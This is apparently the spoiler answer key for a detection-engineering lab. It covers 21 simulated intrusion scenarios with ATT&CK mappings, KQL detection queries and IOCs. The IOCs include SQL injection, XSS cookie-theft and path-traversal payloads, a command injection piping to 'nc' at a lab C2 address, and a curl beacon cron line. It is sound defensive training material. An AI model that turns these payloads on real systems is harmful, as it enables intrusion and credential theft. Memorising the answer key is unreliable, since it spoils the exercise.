# Solutions (spoilers)

> Each scenario is collapsed. Expand only after your own attempt.

<details>
<summary><b>scenario_01 — Phishing to persistence</b></summary>

**Kill chain:** T1566.001 -> T1204.002 -> T1059.001 -> T1105 -> T1547.001 -> T1082

**Steps:**

- `T1566.001` (test 1) — malicious attachment lands on disk (Sysmon file-create)
- `T1204.002` (test 1) — user runs the lure
- `T1059.001` (test 17) — PowerShell stager executes (self-contained command; script-block 4104 + process-create). Note: test 2 in the ATT&CK library is BloodHound/SharpHound - wrong action, downloads a fragile .exe that throws BadImageFormatException and trips AV; test 17 is clean and reliable.
- `T1105` (test 1) — stager reaches out for a second stage
- `T1547.001` (test 1) — persistence via an HKCU Run key
- `T1082` (test 1) — light host discovery (whoami / systeminfo)

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- PowerShell launched on the host — the stager
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"powershell.exe"
  ```
- PowerShell script-block logging captured what actually ran
  - data view: `logs-windows.powershell_operational-*`
  ```
  winlog.event_id:4104
  ```
- Run key written for persistence (the smoking gun)
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:13 AND registry.path:*CurrentVersion*Run*
  ```
- Host discovery — whoami
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"whoami.exe"
  ```

**IOCs:**

- host: `WKSTN-01`
- registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run (value "Atomic Red Team")`
- process: `powershell.exe launched interactively`
- process: `whoami.exe (discovery)`

**Summary:** Execution landed as an encoded PowerShell stager (T1059.001) — visible both as a Sysmon process-create (event 1, process.name powershell.exe) and in the PowerShell Operational script-block log (event 4104). It reached out for a second stage (T1105) and established persistence via a Run key under HKCU\...\CurrentVersion\Run (Sysmon event 13), then ran basic discovery (whoami / systeminfo, T1082). Because this is a host investigation, pivot on the Run key and the PowerShell script-block contents rather than a C2 IP — the workstation's Sysmon + PowerShell logs tell the whole story.

</details>

<details>
<summary><b>scenario_02_linux — SSH brute force to foothold (Linux victim)</b></summary>

**Kill chain:** T1046 -> T1110.001 -> T1059.004 -> T1071.001 -> T1105

**Steps:**

- `T1046` (test 1) — attacker port-scans the victim
- `T1110.001` (test 1) — failed SSH password guesses (auth.log)
- `T1059.004` (test 1) — successful SSH as jdoe, runs id/uname then escalates via NOPASSWD sudo
- `T1071.001` (test 1) — beacon to C2 over HTTP
- `T1105` (test 1) — pulls a second stage from C2

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- IDS alert from the attacker IP (the port scan / SSH burst)
  - data view: `lab-edge-suricata-*`
  ```
  event.kind:"alert" AND source.ip:"172.30.0.100"
  ```
- burst of failed SSH auth on the victim
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Failed" AND host.name:"wkstn-lnx"
  ```
- the successful login that followed the burst
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Accepted" AND host.name:"wkstn-lnx"
  ```
- privilege escalation — attacker runs commands via sudo on the host
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:*COMMAND*
  ```
- HTTP beacon / second-stage pull to the C2
  - data view: `lab-edge-suricata-*`
  ```
  destination.ip:"172.30.0.99"
  ```

**IOCs:**

- ip: `172.30.0.99`
- ip: `172.30.0.100`
- account: `jdoe`
- host: `wkstn-lnx`

**Summary:** Attacker at 172.30.0.100 scanned the host (T1046) — visible as a Suricata alert — then brute-forced SSH (T1110.001): a burst of system.auth.ssh.event "Failed" on wkstn-lnx followed by a single "Accepted" as jdoe (T1059.004). The foothold then beaconed to 172.30.0.99 (T1071.001) and pulled a second stage (T1105), both visible as Suricata flows to the C2. Pivot on the C2 IP to find any other host that reached it.

</details>

<details>
<summary><b>scenario_03_web — Web attack — SQLi & command injection (DVWA)</b></summary>

**Kill chain:** T1595.002 -> T1190

**Steps:**

- `T1595.002` (test 1) — path/vuln probing at the web edge (proxy:81 -> DVWA)
- `T1190` (test 1) — SQLi + command injection + LFI + XSS against DVWA; the WAF blocks (403)

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the WAF (CRS) blocked injection attempts from the attacker
  - data view: `lab-edge-modsecurity-*`
  ```
  event.module:"modsecurity" AND source.ip:"172.30.0.100"
  ```
- SQL injection against the /vulnerabilities/sqli page
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*sqli*
  ```
- command injection / file inclusion trying to read /etc/passwd
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*passwd*
  ```

**IOCs:**

- ip: `172.30.0.100`
- url: `/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users`
- url: `/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd`
- app: `DVWA (behind the WAF at proxy:81 / host :8081)`

**Summary:** A single source at 172.30.0.100 probed the DVWA edge (T1595.002) then launched parameter attacks against it (T1190): SQL injection on /vulnerabilities/sqli, command injection and local file inclusion attempting to read /etc/passwd, and a reflected-XSS probe. ModSecurity (CRS) blocked each with a 403 and recorded it — the audit log ships to lab-edge-modsecurity-* with the real client IP pulled from X-Forwarded-For. Pivot on that source IP to see the full campaign.

</details>

<details>
<summary><b>scenario_04_exfil — Data exfiltration over HTTP (Linux)</b></summary>

**Kill chain:** T1059.004 -> T1048.003

**Steps:**

- `T1059.004` (test 1) — attacker already has SSH as jdoe (see scenario 02)
- `T1048.003` (test 1) — tar /etc/passwd + /etc/shadow + /etc/ssh, POST to the C2 over HTTP

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the collection step — a sudo archive command reading secrets
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:*tar*
  ```
- the outbound exfil / staging flow to the C2
  - data view: `lab-edge-suricata-*`
  ```
  source.ip:"172.30.0.50" AND destination.ip:"172.30.0.99"
  ```

**IOCs:**

- ip: `172.30.0.99`
- host: `wkstn-lnx`
- file: `/tmp/loot.tgz`

**Summary:** Using the jdoe foothold (T1059.004), the attacker used NOPASSWD sudo to archive /etc/passwd, /etc/shadow and /etc/ssh into /tmp/loot.tgz (visible in auth.log as a sudo tar command) and exfiltrated it with an HTTP POST to 172.30.0.99 (T1048.003), then pulled a follow-on stage from the same host. Pivot on the C2 IP and on sudo commands that read credential files.

</details>

<details>
<summary><b>scenario_05_backdoor — Rogue account persistence (Linux)</b></summary>

**Kill chain:** T1059.004 -> T1136.001

**Steps:**

- `T1059.004` (test 1) — attacker has SSH as jdoe
- `T1136.001` (test 1) — create svc_update, set a password, add it to sudo

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- account creation via sudo (useradd)
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:*useradd*
  ```
- the SSH session the change was made from
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Accepted" AND host.name:"wkstn-lnx"
  ```

**IOCs:**

- account: `svc_update`
- host: `wkstn-lnx`

**Summary:** From the jdoe SSH foothold, the attacker created a rogue account "svc_update" with useradd, set a password, and added it to the sudo group (T1136.001) — each step recorded in auth.log as a sudo command. A local account with a service-like name and fresh sudo membership, created interactively, is the tell. Disable it and hunt for logins under it.

</details>

<details>
<summary><b>scenario_06_beacon — Beaconing implant on the Linux host</b></summary>

**Kill chain:** T1053.003 -> T1071.001

**Steps:**

- `T1053.003` (test 1) — the implanted cron calls the C2 every minute (regular interval = beacon)
- `T1071.001` (test 1) — each callback is a small GET /beacon to the C2

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- regular small callbacks from the victim to the C2
  - data view: `lab-edge-suricata-*`
  ```
  source.ip:"172.30.0.50" AND destination.ip:"172.30.0.99"
  ```

**IOCs:**

- ip: `172.30.0.99`
- host: `wkstn-lnx`
- schedule: `cron: * * * * * curl http://172.30.0.99/beacon`

**Summary:** A cron entry on wkstn-lnx calls http://172.30.0.99/beacon every minute (T1053.003 for the persistence, T1071.001 for the C2 channel). The giveaway is the *regularity* — near-identical small flows on a fixed interval, which is what separates a beacon from human browsing. Pivot on the C2 IP; remove the cron entry to kill persistence.

</details>

<details>
<summary><b>scenario_07_web_sqli — SQL injection data theft (DVWA)</b></summary>

**Kill chain:** T1595.002 -> T1190

**Steps:**

- `T1595.002` (test 1) — light probing of the edge first
- `T1190` (test 1) — OR / UNION / blind SQLi against /vulnerabilities/sqli

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the WAF flagged SQL injection on the sqli endpoint
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*sqli*
  ```
- any WAF block from the attacker IP
  - data view: `lab-edge-modsecurity-*`
  ```
  event.module:"modsecurity" AND source.ip:"172.30.0.100"
  ```

**IOCs:**

- ip: `172.30.0.100`
- url: `/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users`

**Summary:** A single source (172.30.0.100) attacked the DVWA "id" parameter with boolean (' OR '1'='1), UNION (SELECT user,password FROM users) and time-based (' AND SLEEP(5)) SQL injection (T1190). ModSecurity flagged and blocked each, recording the payloads to lab-edge-modsecurity-* with the real client IP from X-Forwarded-For. Confirm the WAF blocked (403) rather than the app returning data, then pivot on the source IP.

</details>

<details>
<summary><b>scenario_08_web_lfi — Local file inclusion / path traversal (DVWA)</b></summary>

**Kill chain:** T1083

**Steps:**

- `T1083` (test 1) — ../ traversal, doubled-encoded and null-byte variants aiming at /etc/passwd

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- traversal attempts targeting the file-inclusion page
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*fi*
  ```
- attempts to read /etc/passwd
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*passwd*
  ```

**IOCs:**

- ip: `172.30.0.100`
- url: `/vulnerabilities/fi/?page=../../../../etc/passwd`

**Summary:** The attacker at 172.30.0.100 abused the DVWA file-inclusion parameter (T1083) with directory traversal (../../../../etc/passwd), a doubled-encoding bypass (....//), and a null-byte variant, all aiming at /etc/passwd. ModSecurity's CRS path-traversal rules blocked them and logged the URIs. Check whether any returned file contents vs. a 403, and pivot on the source IP.

</details>

<details>
<summary><b>scenario_09_web_cmdinj — OS command injection to callback (DVWA)</b></summary>

**Kill chain:** T1190

**Steps:**

- `T1190` (test 1) — 127.0.0.1;cat /etc/passwd, ;id, and |nc <c2> 4444 on the exec page

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- command injection on the exec/ping page
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*exec*
  ```
- any WAF block from the attacker IP
  - data view: `lab-edge-modsecurity-*`
  ```
  event.module:"modsecurity" AND source.ip:"172.30.0.100"
  ```

**IOCs:**

- ip: `172.30.0.100`
- ip: `172.30.0.99`
- url: `/vulnerabilities/exec/?ip=127.0.0.1|nc 172.30.0.99 4444`

**Summary:** The attacker injected shell commands into the DVWA exec ("ping") parameter (T1190): chained `;cat /etc/passwd` and `;id`, then `|nc 172.30.0.99 4444` — an attempted reverse connection to the C2. ModSecurity's command-injection rules blocked each and recorded the payloads. The nc callback target (172.30.0.99) ties this to the same C2 the host-based scenarios use.

</details>

<details>
<summary><b>scenario_10_web_xss — Cross-site scripting campaign (DVWA)</b></summary>

**Kill chain:** T1189

**Steps:**

- `T1189` (test 1) — reflected, stored and DOM XSS payloads incl. document.cookie theft

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- XSS payloads against the DVWA xss endpoints
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*xss*
  ```
- script tags in the request (any endpoint)
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND url.original:*script*
  ```

**IOCs:**

- ip: `172.30.0.100`
- url: `/vulnerabilities/xss_s/?txtName=<script>document.cookie</script>`

**Summary:** The attacker at 172.30.0.100 sprayed cross-site scripting payloads (T1189) at DVWA's reflected (xss_r), stored (xss_s) and DOM (xss_d) sinks, including a document.cookie exfiltration attempt on the stored form. ModSecurity's XSS rules flagged the <script> content and logged the URIs. Stored XSS is the one to worry about (it persists for other users); confirm the WAF blocked it.

</details>

<details>
<summary><b>scenario_11_web_scan — Automated web vulnerability scan (edge)</b></summary>

**Kill chain:** T1595.002

**Steps:**

- `T1595.002` (test 1) — broad path enumeration + injection probes at the DVWA edge

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the scanner's probes the WAF flagged
  - data view: `lab-edge-modsecurity-*`
  ```
  event.module:"modsecurity" AND source.ip:"172.30.0.100"
  ```
- the burst of web requests on the wire from the scanner
  - data view: `lab-edge-suricata-*`
  ```
  source.ip:"172.30.0.100"
  ```

**IOCs:**

- ip: `172.30.0.100`
- path: `/.git/config, /.env, /phpinfo.php, /shell.php`

**Summary:** A single source (172.30.0.100) ran an automated sweep of the web edge (T1595.002): requests for /admin, /backup, /.git/config, /.env, /phpinfo.php, webshell names and a few injection probes, in a rapid burst. The tell is the volume and variety from one IP in a short window. Some probes tripped the WAF (lab-edge-modsecurity-*); the whole burst is visible as flows on the edge sensor. Pivot on the source IP and the request rate.

</details>

<details>
<summary><b>scenario_12_linux_privesc — Privilege escalation via sudo (Linux)</b></summary>

**Kill chain:** T1059.004 -> T1548.003

**Steps:**

- `T1059.004` (test 1) — attacker has SSH as jdoe
- `T1548.003` (test 1) — abuse the NOPASSWD sudo rule: sudo su / sudo bash to get a root shell

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- root shell spawned via sudo su
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:"su root"
  ```
- root command shell via sudo bash -c
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:"bash -c"
  ```

**IOCs:**

- account: `jdoe (NOPASSWD sudoer)`
- host: `wkstn-lnx`
- file: `/root/.owned`

**Summary:** jdoe is a passwordless sudoer (the weak config), so after landing the foothold the attacker simply escalated with `sudo su root -c ...` and `sudo bash -c ...` to run as root (T1548.003). Both appear in auth.log as sudo commands invoking a root shell — the tell is an interactive user spawning `su`/`bash` through sudo, not a scripted admin task. Fix: remove the NOPASSWD:ALL rule.

</details>

<details>
<summary><b>scenario_13_linux_credaccess — Post-exploitation credential access (Linux)</b></summary>

**Kill chain:** T1548.003 -> T1552.001

**Steps:**

- `T1548.003` (test 1) — attacker already has root via sudo
- `T1552.001` (test 1) — read /etc/shadow, /etc/gshadow, SSH host key, and bash history

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- reading the shadow password hashes
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:shadow AND message:cat
  ```
- reading root's shell history for secrets
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:bash_history
  ```

**IOCs:**

- file: `/etc/shadow`
- file: `/etc/ssh/ssh_host_rsa_key`
- host: `wkstn-lnx`

**Summary:** As root, the attacker read the credential stores directly (T1552.001): `cat /etc/shadow` and `/etc/gshadow` for password hashes, the SSH host private key, and `/root/.bash_history` for anything typed in the clear. Each is a sudo command reading a sensitive file in auth.log. Anything read here — the password hashes, the host key — must be treated as compromised and rotated.

</details>

<details>
<summary><b>scenario_14_win_privesc — Privilege escalation on the workstation (Windows)</b></summary>

**Kill chain:** T1548.002 -> T1134.001

**Steps:**

- `T1548.002` (test 1) — UAC bypass via Event Viewer — writes an HKCU mscfile shell-open hijack
- `T1134.001` (test 1) — named-pipe token impersonation

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- UAC bypass — the mscfile shell\open\command hijack in HKCU
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:13 AND registry.path:*mscfile*
  ```
- token / named-pipe impersonation activity
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.command_line:*pipe*
  ```

**IOCs:**

- host: `WKSTN-01`
- registry: `HKCU\Software\Classes\mscfile\shell\open\command`

**Summary:** The attacker escalated on WKSTN-01 with a UAC bypass through Event Viewer (T1548.002) — the tell is a shell-open-command hijack written under HKCU\...\mscfile in the Sysmon registry events — and a named-pipe token impersonation (T1134.001), visible in process command lines. Both are host-based; there is no network IOC. Hunt the mscfile registry write and the pipe-impersonation process tree.

</details>

<details>
<summary><b>scenario_15_win_postex — Credential dumping & discovery (Windows)</b></summary>

**Kill chain:** T1003.001 -> T1087.001 -> T1057

**Steps:**

- `T1003.001` (test 3) — dump LSASS memory (Outflank Dumpert, direct syscalls)
- `T1087.001` (test 1) — local account discovery
- `T1057` (test 2) — process discovery (tasklist)

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the LSASS-dumping tool executing
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"Outflank-Dumpert.exe"
  ```
- the LSASS memory dump file written to disk
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:11 AND file.name:"dumpert.dmp"
  ```
- host discovery — process listing
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"tasklist.exe"
  ```

**IOCs:**

- host: `WKSTN-01`
- tool: `Outflank-Dumpert.exe`
- file: `C:\Windows\Temp\dumpert.dmp`

**Summary:** The attacker dumped LSASS on WKSTN-01 with Outflank Dumpert (T1003.001), which wrote the memory image to C:\Windows\Temp\dumpert.dmp — visible as the tool process (Sysmon 1) and the dump file (Sysmon 11) — then enumerated local accounts (T1087.001) and running processes (T1057). Every credential resident in LSASS at that moment must be treated as stolen: rotate passwords and any cached domain/service credentials, and hunt for reuse.

</details>

<details>
<summary><b>scenario_16_linux_antiforensics — Anti-forensics — log & history wiping (Linux)</b></summary>

**Kill chain:** T1059.004 -> T1070.002

**Steps:**

- `T1059.004` (test 1) — successful SSH as jdoe (the foothold), then escalates via NOPASSWD sudo
- `T1070.002` (test 1) — clears /var/log/wtmp, btmp, syslog and root's bash_history via sudo

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the login the attacker cleaned up after
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Accepted" AND host.name:"wkstn-lnx"
  ```
- log wiping — truncating files under /var/log via sudo
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:truncate
  ```
- login records (wtmp) cleared to hide the session
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:wtmp
  ```
- root's shell history wiped to hide what was typed
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:bash_history
  ```

**IOCs:**

- account: `jdoe (NOPASSWD sudoer)`
- host: `wkstn-lnx`
- file: `/var/log/wtmp (truncated)`
- file: `/root/.bash_history (wiped)`

**Summary:** After landing the jdoe foothold and escalating (the account is a passwordless sudoer), the attacker tried to erase their tracks (T1070.002): `truncate -s 0` against /var/log/wtmp and /var/log/btmp, blanking /var/log/syslog, and clearing /root/.bash_history — every step run through sudo. The irony is the tell: those sudo COMMAND= entries are themselves in auth.log, and the events shipped to the SIEM before the local files were wiped, so the timeline survives the cleanup. Pivot on the sudo commands touching /var/log and .bash_history to bound exactly what the attacker was trying to hide.

</details>

<details>
<summary><b>scenario_17_linux_cronpersist — Scheduled-job persistence & C2 beacon (Linux)</b></summary>

**Kill chain:** T1059.004 -> T1053.003

**Steps:**

- `T1059.004` (test 1) — successful SSH as jdoe (the foothold), escalates via NOPASSWD sudo
- `T1053.003` (test 1) — drops a root cron job under /etc/cron.d that beacons to the C2, then fires callbacks

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the foothold session the persistence was installed from
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Accepted" AND host.name:"wkstn-lnx"
  ```
- the cron persistence written under /etc/cron.d via sudo
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:"cron.d"
  ```
- the scheduled beacon calling home to the C2
  - data view: `lab-edge-suricata-*`
  ```
  destination.ip:"172.30.0.99"
  ```

**IOCs:**

- ip: `172.30.0.99`
- account: `jdoe (NOPASSWD sudoer)`
- host: `wkstn-lnx`
- file: `/etc/cron.d/sys-refresh`

**Summary:** From the jdoe foothold the attacker established persistence with a scheduled job (T1053.003): a root cron entry dropped at /etc/cron.d/sys-refresh that curls the C2 at 172.30.0.99 every few minutes. Because it was written with sudo, the create shows up in auth.log as a sudo COMMAND touching /etc/cron.d; because the beacon runs on the victim, suricata-victim records the recurring flow to the C2. Unlike a user crontab, an /etc/cron.d drop is easy to miss — hunt both the sudo write and the periodic outbound flow, and remove the file to cut persistence.

</details>

<details>
<summary><b>scenario_18_win_persistence — Scheduled-task & service persistence (Windows)</b></summary>

**Kill chain:** T1053.005 -> T1543.003

**Steps:**

- `T1053.005` (test 2) — persistence via a locally-registered scheduled task (schtasks.exe)
- `T1543.003` (test 2) — persistence via a new Windows service (sc.exe create)

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- scheduled task registered for persistence
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"schtasks.exe"
  ```
- the planted task's name (schtasks /TN spawn) — a specific IOC
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"schtasks.exe" AND process.command_line:*spawn*
  ```
- a new Windows service installed for persistence (sc create)
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"sc.exe" AND process.command_line:*create*
  ```

**IOCs:**

- host: `WKSTN-01`
- process: `schtasks.exe /Create /TN spawn`
- process: `sc.exe create`

**Summary:** The attacker set up two independent persistence mechanisms on WKSTN-01 so a single cleanup wouldn't evict them: a locally-registered scheduled task (T1053.005) created with schtasks.exe /create, and a new Windows service (T1543.003) installed with sc.exe create. Both surface as Sysmon process-create (event 1) events — hunt schtasks.exe and sc.exe with creation command lines, then enumerate scheduled tasks and services on the host to remove the planted entries. A Run key search alone (scenario 01) would have missed both.

</details>

<details>
<summary><b>scenario_19_win_discovery — Host discovery & LOLBin proxy execution (Windows)</b></summary>

**Kill chain:** T1016 -> T1049 -> T1218.011

**Steps:**

- `T1016` (test 1) — system network configuration discovery (ipconfig / arp / route / netstat)
- `T1049` (test 1) — system network connections discovery (netstat -ano)
- `T1218.011` (test 9) — signed-binary proxy execution — rundll32 proxies an app via pcwutl.dll,LaunchApplication (LOLBin)

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- network configuration discovery — ipconfig
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"ipconfig.exe"
  ```
- network connections discovery — netstat
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.command_line:*netstat*
  ```
- LOLBin proxy execution — rundll32 loading pcwutl.dll to launch an app
  - data view: `logs-windows.sysmon_operational-*`
  ```
  winlog.event_id:1 AND process.name:"rundll32.exe" AND process.command_line:*pcwutl*
  ```

**IOCs:**

- host: `WKSTN-01`
- process: `ipconfig.exe / arp.exe / netstat.exe (discovery)`
- process: `rundll32.exe (signed-binary proxy execution)`

**Summary:** Before acting on objectives, the attacker oriented themselves on WKSTN-01: system network configuration discovery (T1016) via ipconfig / arp / route, and network connections discovery (T1049) via netstat -ano — a burst of built-in recon utilities in a short window. They also abused a trusted signed binary, rundll32.exe, to proxy execution via pcwutl.dll,LaunchApplication (T1218.011) — a living-off-the-land technique that dodges application allow-listing. All are Sysmon process-create events; the rundll32 line is the standout, since rundll32 spawning script content is not normal. Pivot on the recon cluster to bound when the attacker was hands-on.

</details>

<details>
<summary><b>scenario_20_linux_fullchain — Full intrusion — foothold to exfil to cover-up (Linux)</b></summary>

**Kill chain:** T1046 -> T1110.001 -> T1059.004 -> T1548.003 -> T1552.001 -> T1136.001 -> T1053.003 -> T1048.003 -> T1070.002

**Steps:**

- `T1046` (test 1) — attacker port-scans the victim (recon)
- `T1110.001` (test 1) — SSH password guessing — a burst of failures
- `T1059.004` (test 1) — successful SSH as jdoe (the foothold), first sudo commands
- `T1548.003` (test 1) — privilege escalation — abuses NOPASSWD sudo to get a root shell
- `T1552.001` (test 1) — credential access — reads /etc/shadow, SSH keys, bash history as root
- `T1136.001` (test 1) — persistence #1 — creates a rogue sudo account (svc_update)
- `T1053.003` (test 1) — persistence #2 — root cron under /etc/cron.d beaconing to the C2
- `T1048.003` (test 1) — collection + exfiltration — tars secrets and POSTs them to the C2
- `T1070.002` (test 1) — anti-forensics — wipes /var/log and root's bash history to cover tracks

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- 1. recon — IDS alert from the attacker IP (the scan / SSH burst)
  - data view: `lab-edge-suricata-*`
  ```
  event.kind:"alert" AND source.ip:"172.30.0.100"
  ```
- 2. initial access — the burst of failed SSH auth
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Failed" AND host.name:"wkstn-lnx"
  ```
- 3. foothold — the successful login that followed the burst
  - data view: `logs-system.auth-*`
  ```
  system.auth.ssh.event:"Accepted" AND host.name:"wkstn-lnx"
  ```
- 4. privilege escalation — root shell via sudo su
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:"su root"
  ```
- 5. credential access — reading the shadow password hashes
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:shadow AND message:cat
  ```
- 6. persistence #1 — rogue account creation (useradd)
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:*useradd*
  ```
- 7. persistence #2 — cron job written under /etc/cron.d
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:"cron.d"
  ```
- 8. collection — a sudo archive command reading secrets
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:*tar*
  ```
- 9. exfil / C2 — outbound flow from the victim to the C2
  - data view: `lab-edge-suricata-*`
  ```
  source.ip:"172.30.0.50" AND destination.ip:"172.30.0.99"
  ```
- 10. anti-forensics — truncating logs under /var/log to cover tracks
  - data view: `logs-system.auth-*`
  ```
  process.name:"sudo" AND message:truncate
  ```

**IOCs:**

- ip: `172.30.0.100 (attacker)`
- ip: `172.30.0.99 (C2 / exfil)`
- account: `jdoe (compromised foothold, NOPASSWD sudoer)`
- account: `svc_update (rogue persistence account)`
- host: `wkstn-lnx`
- file: `/etc/cron.d/sys-refresh (cron persistence)`
- file: `/tmp/loot.tgz (staged exfil archive)`
- file: `/var/log/wtmp, /root/.bash_history (wiped)`

**Summary:** A complete intrusion on wkstn-lnx, in order. The attacker at 172.30.0.100 scanned the host (T1046) and brute-forced SSH (T1110.001) — a burst of failed logins then a single Accepted as jdoe (T1059.004). Because jdoe is a passwordless sudoer, they escalated to root (T1548.003) and read the credential stores — /etc/shadow, SSH keys, bash history (T1552.001), so treat those as stolen and rotate them. They established TWO persistence mechanisms: a rogue sudo account "svc_update" (T1136.001) and a root cron job at /etc/cron.d/sys-refresh beaconing the C2 (T1053.003). They then archived secrets into /tmp/loot.tgz and exfiltrated over HTTP to 172.30.0.99 (T1048.003) — visible as a victim→C2 flow — and finally tried to cover their tracks by truncating /var/log files and wiping root's bash history (T1070.002). The cover-up is self-defeating: every destructive step ran through sudo and is in auth.log, and the events shipped to the SIEM before the local logs were blanked. Deliverable: full timeline, both persistence mechanisms removed, and every credential read here rotated.

</details>

<details>
<summary><b>scenario_21_web_juiceshop — API attack on the shop app — SQLi & XSS (Juice Shop)</b></summary>

**Kill chain:** T1190

**Steps:**

- `T1190` (test 1) — SQLi auth-bypass + UNION search injection + XSS at the Juice Shop REST API

**How to detect it** (every query is validated against the seeded telemetry; switch Discover to Lucene, or read them as KQL):

- the shop-app WAF flagged the attacker's injection probes
  - data view: `lab-edge-modsecurity-*`
  ```
  event.module:"modsecurity" AND source.ip:"172.30.0.100" AND log.file.path:"/logs/modsec/audit.log"
  ```
- CRS SQL-injection rules tripped on the search API
  - data view: `lab-edge-modsecurity-*`
  ```
  source.ip:"172.30.0.100" AND log.file.path:"/logs/modsec/audit.log" AND transaction.messages.details.tags:*sqli*
  ```
- the attacker's web traffic on the wire at the edge
  - data view: `lab-edge-suricata-*`
  ```
  source.ip:"172.30.0.100"
  ```

**IOCs:**

- ip: `172.30.0.100 (attacker)`
- host: `Juice Shop (proxy:80 -> waf -> juiceshop)`
- endpoint: `/rest/user/login (SQLi auth bypass)`
- endpoint: `/rest/products/search (UNION SQLi + XSS)`

**Summary:** A single source (172.30.0.100) attacked the Juice Shop REST API through its WAF (T1190): a SQL-injection auth bypass on /rest/user/login, UNION-based injection in /rest/products/search, and a reflected-XSS payload on the same search endpoint. CRS blocked the injection attempts and logged them to the Juice Shop WAF's audit log (log.file.path /logs/modsec/audit.log) — which is what separates this from the DVWA cases (audit-dvwa.log) and from the constant benign browser traffic (source 172.30.0.1). The whole burst is also visible as edge Suricata flows from the attacker IP. Pivot on the source IP and the /rest/* endpoints; confirm no request from that IP returned a 200 with data.

</details>
